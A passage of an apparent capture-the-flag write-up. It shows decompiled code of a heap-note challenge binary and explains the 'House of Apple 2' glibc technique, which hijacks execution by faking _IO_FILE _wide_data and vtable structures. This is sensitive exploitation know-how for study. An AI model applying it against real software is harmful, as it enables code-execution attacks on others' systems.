style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x168e - 0x17b4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> read_note\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x1696\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // bp-20, 0x16a5\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v3;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x168e\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (g7 \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x176c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">?? GET SPOTIFY PREMIUM ??\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%s\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"&#x3C; BACK\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    } \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x16bb\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">ENTER INDEX: \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%3d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v2);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        getchar\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v2 \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 11\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            // 0x1710\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"NOTE: \u003C/span>\u003Cspan style=\"color:#79B8FF\">%s\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, (\u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g5));\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%s\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"&#x3C; BACK\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            g7 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g8;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        } \u003C/span>\u003Cspan style=\"color:#F97583\">else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">            // 0x16f7\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">            puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"color:#9ECBFF\">!! INVALID NOTE INDEX !!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            v3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ffffffff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v3;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x17ab\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (v1 \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#B392F0\"> __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x17ad\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        __stack_chk_fail\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        result \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g9;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x17b2\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x17b4 - 0x198b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#B392F0\"> main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int\u003C/span>\u003Cspan style=\"color:#FFAB70\"> argc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">char\u003C/span>\u003Cspan style=\"color:#F97583\"> **\u003C/span>\u003Cspan style=\"color:#FFAB70\"> argv\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x17b4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    __readfsqword\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">40\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    setup\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    menu\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\">> \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v1;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // bp-20, 0x17b4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%1d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v1);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    uint32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v2;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x182b\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v1 \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x181a\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        v2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v1 \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">3fffffffc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g1);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g1;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[ INVALID CHOICE ]\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    menu\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\">> \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">    scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%1d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v1);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    while\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ((\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v1 \u003C/span>\u003Cspan style=\"color:#F97583\">>=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // 0x1958\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        puts\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[ INVALID CHOICE ]\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        menu\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        printf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\">> \"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        scanf\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%1d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">v1);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x181a\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    v2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">int32_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)((\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> v1 \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">3fffffffc\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g1);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)v2 \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">g1;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Address range: 0x198c - 0x1999\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">int64_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> _fini\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // 0x198c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    int64_t\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // 0x198c\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> result;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// --------------------- Meta-Information ---------------------\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Detected compiler/packer: gcc (14.2.1)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">// Detected functions: 25\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>While researching heap exploitation techniques and going through various “House of ____” exploits, I found that \u003Ca href=\"https://bbs.kanxue.com/thread-273832.htm\">\u003Cstrong>House of Apple 2\u003C/strong>\u003C/a> matched perfectly with what this challenge required.\u003C/p>\n\u003Cp>The House of Apple technique is primarily concerned with \u003Ccode>_IO_FILE->_wide_data\u003C/code> member attacks. It allows us to rewrite memory after hijacking this member or control the program execution flow through FILE structure corruption.\u003C/p>\n\u003Ch2 id=\"what-is-a-vtable\">What is a Vtable?\u003C/h2>\n\u003Cp>A basic vtable is nothing more than an ordinary struct containing function pointers, which can be shared between object instances.\u003C/p>\n\u003Cp>Ill try to write a demo program to understand hoa-2 better and what does it solve and what it does  .\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-3.png\" alt=\"Decompiled Code\">\u003C/p>\n\u003Ch3 id=\"glibc-internals\">glibc Internals\u003C/h3>\n\u003Cp>Next we will need a heap controlled area for exploiting. Before that, some glibc internals.\u003C/p>\n\u003Cp>glibc uses a big internal structure called \u003Ccode>struct _IO_FILE\u003C/code>. This is what backs FILE * objects like stdout, stderr, file streams, etc.\u003C/p>\n\u003Cp>For wide-character support (wprintf, fputwc, Unicode stuff), glibc adds extra indirection. _wide_data stores wide-character state and buffers. _wide_vtable is the function pointer table for wide I/O operations. These are separate pointers inside the FILE structure.\u003C/p>\n\u003Ch2 id=\"what-is-_wide_data\">What is _wide_data?\u003C/h2>\n\u003Cp>_wide_data is a pointer inside _IO_FILE:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_FILE {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_wide_data \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_wide_data;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>What it contains conceptually: _IO_wide_data holds wide-character buffers, state for multibyte to wide-char conversion, and pointers used during wide I/O operations.\u003C/p>\n\u003Cp>Simplified idea:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _IO_wide_data {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    wchar_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_IO_read_ptr;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    wchar_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_IO_read_end;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    wchar_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_IO_write_ptr;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    wchar_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_IO_write_end;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ...\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">};\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The thing is, if you control _wide_data, glibc will trust pointers inside it. Those pointers get dereferenced during I/O operations. Fake _wide_data lets you redirect reads/writes or prepare for a vtable call.\u003C/p>\n\u003Ch1 id=\"glibc-vtable-exploitation\">glibc vtable exploitation\u003C/h1>\n\u003Cp>When glibc performs an I/O operation, it does something like:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">fp\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_wide_data\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#E1E4E8\">_wide_vtable\u003C/span>\u003Cspan style=\"color:#F97583\">->\u003C/span>\u003Cspan style=\"color:#B392F0\">overflow\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(fp, ch);\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>If _wide_vtable is fake and heap-controlled, glibc jumps to an attacker-controlled address. This is a clean RIP control primitive.\u003C/p>\n\u003Cp>Internally, libc has three global FILE objects: stdin, stdout, stderr. Each of these is a fully-initialized _IO_FILE structure with valid locks, valid mode flags, valid wide I/O state, and most importantly our trusted vtables.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-4.png\" alt=\"Wide Data Structure\">\u003C/p>\n\u003Ch2 id=\"what-_mode-does\">What _mode does\u003C/h2>\n\u003Cp>Inside _IO_FILE:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan 